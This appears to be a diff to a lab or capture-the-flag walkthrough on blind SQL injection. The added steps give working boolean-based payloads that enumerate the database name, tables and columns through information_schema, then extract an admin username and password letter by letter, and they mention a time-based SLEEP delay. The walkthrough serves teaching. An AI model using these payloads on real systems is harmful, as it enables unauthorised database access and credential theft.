@@ -21,6 +21,16 @@ This actually works because the condition 1=1 is always true and we use '--' to 
 LEVEL3:BOOLEAN BASED SQLI
 The main thing of this level is the boolean result, true or false.You do not see anything,only true or false.
 Step 1: Confirm injecion:(admin123' UNION SELECT 1,2,3 where database() like '%';--) 
-This always returns true because the wildcard % matches anything so the conditions is always true.
+This always returns true because the % wildcard matches anything so the conditions is always true.
+Step 2:Get the databse name: We can use this command:(admin123' UNION SELECT 1,2,3 where database() like 's%';--),this will return '{"taken":true}' so the first letter of the db is 's'.Continue like this for the full database name.
+Step 3: Tables name
+In a similar way, we can find the table name with the same logic:(admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--).So on for the full name
+Step 4:Columns name
+(admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--)You find username and password columns.
+Step 5:Get the username and the password
+(admin123' UNION SELECT 1,2,3 from users where username like 'a%';--)\\username command
+(admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--)\\password command
+On the level 4, you have the time-based sqli and you just have to put a delay in the command like this:
+SLEEP(5);if true, it will sleep for 5 seconds.
 
   
